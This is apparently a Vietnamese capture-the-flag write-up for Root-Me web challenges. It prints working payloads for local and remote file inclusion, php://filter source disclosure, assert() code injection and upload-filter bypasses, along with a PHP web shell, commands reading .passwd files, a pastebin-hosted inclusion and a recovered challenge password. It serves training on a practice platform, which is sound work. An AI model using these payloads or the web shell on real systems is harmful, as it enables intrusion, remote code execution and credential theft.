### Local File Inclusion
![image](https://user-images.githubusercontent.com/77602549/164174516-0f929bb8-5a10-4fdc-8b86-d54a5687dc73.png)


![image](https://user-images.githubusercontent.com/77602549/164175580-fb16a8e5-ccde-49c6-9efc-9dddf4473bd8.png)

Vậy thư mục admin nằm ngay trong thư mục root.
Ta phải lấy được source code của file index.php

Chúng ta thử dần các payload sau:
  
  + ?files=sysadm&f=/admin/index.php cái này khỏi thử, không có chuyện admin nằm trong đây đâu
  + ?files=sysadm&f=../index.php cái này khỏi thử, nếu admin nằm ngoài đây thì sysadm sẽ thành web-serveur/ch16/admin/sysadm/ rồi, nhưng cũng đáng thử, để biết chall có chặn .. không
  + ?files=sysadm&f=../admin/index.php lỗi file_get_contents(): Filename cannot be empty
  + ?files=sysadm&f=../../admin/index.php di chuyển ra thêm một thư mục nữa -BOOM- ta được source code của file index

![image](https://user-images.githubusercontent.com/77602549/164176305-bc555b84-c24b-4c7d-8c1d-e216cb9ed005.png)





## Local File Inclusion - Double encoding

![image](https://user-images.githubusercontent.com/77602549/164176760-d250d227-f597-4e7c-912a-d9c945de213f.png)


We will use php://filter with base64 encoding

php://filter/convert.base64-encode/resource=cv

after double encoding

php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv




http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf


![image](https://user-images.githubusercontent.com/77602549/164178518-8fb1d70b-6565-4528-8787-7cbd74f7fb66.png)



## Local File Inclusion - Wrappers

![image](https://user-images.githubusercontent.com/77602549/164179748-a96d3d97-6d31-40f9-af6c-74999959a7ec.png)


![image](https://user-images.githubusercontent.com/77602549/164187956-623d7d22-ac08-4ac2-900a-33fab04896fe.png)



<?php $data = file_get_contents(“index.php”); echo $data; ?>


https://vietjack.com/php/ham_scandir_trong_php.jsp



![image](https://user-images.githubusercontent.com/77602549/164188168-fa5d727f-740a-4cab-81c6-33df0d0a3d09.png)



name too long
![image](https://user-images.githubusercontent.com/77602549/164188972-82a3d7f6-414d-42d3-b66a-591f08f132bc.png)

```
<?php 
   $path = getcwd();
   $items = scandir($path);
   
   echo "<p>Content of $path</p>";
   echo '<ul>';
   foreach ($items as $item) {
       echo '<li>' . $item . '</li>';
   }
   echo '</ul>';  
?>

```

![image](https://user-images.githubusercontent.com/77602549/164195162-1aafd712-1969-40f5-9b04-0de766c9ccaf.png)



![image](https://user-images.githubusercontent.com/77602549/164193342-b6c70f3b-fbed-44e0-9f25-295b4e399444.png)


```
<?php
   show_source('flag-mipkBswUppqwXlq9ZydO.php'); 
?>
```
## Remote File Inclusion



ĐIỀU QUAN TRỌNG VỚI DẠNG BÀI REMOTE FILE INCLUSION NÀY , TA PHẢI INCLUDE 1 FILE TỪ WEB SERVER KHÁC !

![image](https://user-images.githubusercontent.com/77602549/164913369-8c5bb10e-4b20-4d0f-94b6-c4971bb94b8f.png)


Dùng 1 server khác để get tham số là câu lệnh <?php echo file_get_contents ('index.php')?>

Mình sẽ đề xuất sử dụng https://pastebin.com/ vì nó khá là tiện 


?lang=https://pastebin.com/raw/LjpyDxwq?

Chúng ta có thể thấy được source của file index.php như sau: 


![image](https://user-images.githubusercontent.com/77602549/164913436-ad52a7cf-d6ec-4717-ba67-3a515c17e02e.png)




## HTTP - Directory indexing

![image](https://user-images.githubusercontent.com/77602549/164369902-07dcd33e-d61f-4803-ab1a-8bb4d676ee70.png)



![image](https://user-images.githubusercontent.com/77602549/164369994-0717f0f4-9d35-4d32-896d-e20f1ec686ec.png)



![image](https://user-images.githubusercontent.com/77602549/164369921-1623f8fd-d2b4-4ad5-aed4-0ef04884f0c9.png)



## File upload - Double extensions

![image](https://user-images.githubusercontent.com/77602549/164371548-8de896ab-5b5a-417e-88b2-161fa7313293.png)


<?php

$data = system($_GET["cmd"]);
echo $data;

?>

![image](https://user-images.githubusercontent.com/77602549/164960644-b3a34d8c-6c4d-49db-afef-ee43889d87ab.png)


![image](https://user-images.githubusercontent.com/77602549/164960537-34859513-220c-40d9-ac16-164c956ae834.png)



?cmd=ls -la


![image](https://user-images.githubusercontent.com/77602549/164960705-8ba8b453-9ac8-4368-a798-a2b3c1d47d97.png)


?cmd=ls -la?cmd=cat ../../../.passwd


![image](https://user-images.githubusercontent.com/77602549/164960719-3c6f6c01-c6e1-4f1b-9e35-59178a2cd8be.png)


## File upload – MIME type

![image](https://user-images.githubusercontent.com/77602549/164523876-fdd1951d-9f97-4e9e-b4d3-604da8d6cda5.png)
[Mine type](https://wiki.tino.org/mime-type-la-gi/)

![image](https://user-images.githubusercontent.com/77602549/164966150-7ea79496-ffd0-4ef9-b6c8-53c0a297d1d5.png)


Chổ Content-type nó sẽ định nghĩa kiểu dữ liệu mà bạn sẽ upload lên, thay thành image/png nó sẽ hiểu đó là ảnh chứ không phải php file.

![image](https://user-images.githubusercontent.com/77602549/164966176-4c78ae19-2485-4107-8e98-2dd98b1fc94a.png)


?cmd=cat ../../../.passwd


![image](https://user-images.githubusercontent.com/77602549/164966203-5d38b61b-fa6a-4290-addd-827707167cd1.png)







## Directory traversal

![image](https://user-images.githubusercontent.com/77602549/164531455-7057e609-5ac9-4234-ac38-7b845bd97dcf.png)



![image](https://user-images.githubusercontent.com/77602549/164531414-7525dd8f-ad9d-4613-a76b-8889f2b4b565.png)




## PHP - assert()
![image](https://user-images.githubusercontent.com/77602549/164538756-974ad560-7375-403e-927e-553ec78cc2b4.png)


Assert() được dùng giống như else trong điều kiện if vậy, thường được dùng để debug:

$a = 1; 
assert($a === 1, '$a is not 1'); 
assert($a === 2, '$a is not 1');
Sau vài lần thử thì nhận ra đây là dạng code injection. Template của nó:

$i = "includes/" .$_GET['page'];
$i .= ".php";
assert(strpos($i, '..') === False, 'Detect hacking');


![image](https://user-images.githubusercontent.com/77602549/164540257-9693a9cf-a390-4f01-b3c6-8a116e84374e.png)



![image](https://user-images.githubusercontent.com/77602549/164540226-f9cc7e33-d0b1-43c8-820e-dfc33750dc17.png)


## PHP - Filters


Bài này cho thấy impact của PHP streams, cụ thể là filter wrapper, là một trong những dạng LFI, đáng nhẽ phải giải bài này trước thì bài Local File Inclusion – Double encoding này mình đã không phải đi kiếm lời giải. Thử dần các trang dưới, output là dạng base64:

inc=php://filter/convert.base64-encode/resource=accueil.php
inc=php://filter/convert.base64-encode/resource=login.php
inc=php://filter/convert.base64-encode/resource=config.php
inc=php://filter/convert.base64-encode/resource=index.php
inc=php://filter/convert.base64-encode/resource=ch12.php
Với trang login.php, sau khi decode base64 thì ta tìm được trang config.php. Flag nằm trong đây:

$username="admin";
$password="DAPt9D2mky0APAF";



## PHP - register globals

Sau vài lần thử thì với biến _SESSION, ta thấy xuất hiện lỗi

http://challenge01.root-me.org/web-serveur/ch17/?_SESSION=qwerty1234567890
Warning: Illegal string offset 'logged' in /challenge/web-serveur/ch17/index.php on line 11
Vậy ta biết phần tử trong biến _SESSION là logged, ta thử link dưới rồi bấm enter mà không cần nhập password vào

http://challenge01.root-me.org/web-serveur/ch17/?_SESSION.logged=1 # FAIL, PHP ko set như vầy
http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1






